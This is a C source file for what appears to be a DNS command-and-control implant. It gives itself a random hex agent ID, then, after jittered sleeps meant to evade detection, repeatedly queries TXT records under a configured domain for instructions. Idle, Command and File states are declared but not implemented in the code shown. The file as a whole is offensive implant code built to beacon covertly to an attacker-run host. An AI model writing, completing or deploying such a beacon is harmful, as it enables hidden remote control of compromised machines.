#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "utils.h"
#include "options.h"

/* DNS STUFF */
#include <sys/types.h>
#include <resolv.h>
#include <ctype.h>
/* DNS STUFF */

#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif

// https://stackoverflow.com/a/1941331
#ifdef DEBUG
#define Dprintf(fmt, args...) printf(fmt, ##args)
#else
#define Dprintf(fmt, args...)
#endif

enum State
{
    Idle,
    Command,
    File
};

int main(int argc, char **args)
{

    unsigned char answer[300];
    int len;
    ns_msg msg;
    ns_rr rr;

    Dprintf("booting for %s\n", DOMAIN);
    srand(time(NULL));

    char dom[256];
    char agent_id[5];
    char agent_id_hex[sizeof(agent_id) * 2];

    rand_str(agent_id, sizeof(agent_id));
    str2hexstr(agent_id, agent_id_hex);

    snprintf(dom, sizeof(dom), "%s.%s", agent_id_hex, DOMAIN);
    Dprintf("agent domain: %s\n", dom);

    while (1)
    {
        Dprintf("starting jittered sleep\n");
        jittered_sleep();

        len = res_query(dom, ns_c_in, ns_t_txt, answer, sizeof(answer));
        Dprintf("txt lookup len %d\n", len);

        if (len <= 0)
            continue;

        if (ns_initparse(answer, len, &msg) < 0)
            continue;

        int rrmax = ns_msg_count(msg, ns_s_an);

        for (int i = 0; i < rrmax; i++)
        {
            if (ns_parserr(&msg, ns_s_an, i, &rr))
                continue;

            const u_char *rd = ns_rr_rdata(rr);

            // first byte is the data len
            // size_t length = rd[0];

            printf("answer: %s\n", rd++);
        }
    }

    return 0;
}
